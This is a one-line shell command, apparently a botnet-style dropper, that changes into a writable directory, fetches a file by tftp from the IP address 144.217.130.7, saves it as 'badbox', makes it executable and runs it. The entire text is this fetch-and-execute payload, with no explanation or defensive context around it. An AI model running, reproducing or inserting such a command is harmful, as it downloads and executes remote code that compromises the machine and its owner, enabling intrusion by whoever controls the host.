cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 144.217.130.7 -c get ' ';cat ' ' >badbox;chmod +x *;./badbox
